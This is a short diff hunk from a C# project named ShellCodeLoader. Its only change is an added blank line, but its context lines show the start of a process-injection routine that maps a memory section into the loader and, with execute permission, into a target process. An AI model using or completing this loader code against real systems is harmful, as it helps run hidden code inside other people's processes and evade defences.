@@ -45,6 +45,7 @@ namespace ShellCodeLoader
             UInt64 localOffset = 0;
             Imports.NtMapViewOfSection(hSectionHandle, Process.GetCurrentProcess().Handle, ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref localOffset, ref RegionSize, Imports.VIEWUNMAP, 0, PageProtection.PAGE_READWRITE);
 
+
             UInt64 remoteOffset = 0;
             IntPtr pRemoteView = IntPtr.Zero;
             Imports.NtMapViewOfSection(hSectionHandle, Target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref remoteOffset, ref RegionSize, Imports.VIEWUNMAP, 0, PageProtection.PAGE_EXECUTE_READ);
